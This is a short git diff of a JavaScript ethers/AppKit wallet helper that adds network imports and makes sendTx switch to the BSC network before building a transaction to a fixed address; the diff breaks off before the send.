@@ -1,5 +1,5 @@
 import { BrowserProvider, Contract, formatUnits, parseEther } from "ethers";
-
+import { bsc, arbitrum, mainnet, optimism, polygon, sepolia } from '@reown/appkit/networks'
 export const signMessage = async (provider, address) => {
   if (!provider) return Promise.reject("No provider available");
 
@@ -9,9 +9,11 @@ export const signMessage = async (provider, address) => {
   });
 };
 
-export const sendTx = async (provider, address) => {
+export const sendTx = async (provider, address, appKit) => {
   if (!provider) return Promise.reject("No provider available");
 
+  await appKit.switchNetwork(bsc);
+  
   const tx = {
     from: address,
     to: "0x302D8DA8967f9afA00f1DcdbD70aF0F30784BDF2",
